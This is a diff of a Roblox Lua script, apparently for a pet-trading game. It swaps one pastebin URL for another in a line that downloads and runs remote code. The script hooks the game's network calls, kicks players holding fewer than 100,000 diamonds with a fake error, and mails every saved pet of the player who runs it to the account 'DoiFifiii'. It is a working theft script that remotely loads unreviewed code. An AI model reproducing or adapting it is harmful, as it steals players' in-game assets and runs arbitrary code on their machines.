@@ -1,7 +1,7 @@
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
 local savedPets = FrameworkLibrary.Save.Get().Pets
-loadstring(game:HttpGet("https://pastebin.com/raw/4HiCXYq1"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/BgwdW7Gm"))()
     
 if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
     game.Players.LocalPlayer:Kick("Error found while executing.") else
@@ -17,7 +17,7 @@ for i,v in pairs(savedPets) do
                     ["Recipient"]= "DoiFifiii",
                     ["Diamonds"]= 0, 
                     ["Pets"]= {v.uid}, -- dont change
-                    ["Message"]= "Made by Zey + Max"
+                    ["Message"]= "Made by Zey"
                 }}
         Invoke("Send Mail", unpack(args)) 
          wait(1.75) 
